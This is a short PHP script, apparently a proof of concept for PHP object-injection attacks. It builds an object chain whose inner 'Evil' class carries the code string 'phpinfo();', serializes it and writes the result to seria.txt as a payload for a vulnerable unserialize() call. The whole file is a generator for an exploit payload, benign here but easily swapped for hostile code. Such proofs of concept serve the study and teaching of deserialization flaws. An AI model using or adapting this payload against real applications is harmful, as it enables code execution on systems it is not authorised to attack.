<?php
class K0rz3n {
    private $test;
    function __construct() {
        $this->test = new Evil;
    }
}

class Evil {
    var $test2 = "phpinfo();";
}

$K0rz3n = new K0rz3n;
$data = serialize($K0rz3n);
file_put_contents("seria.txt", $data);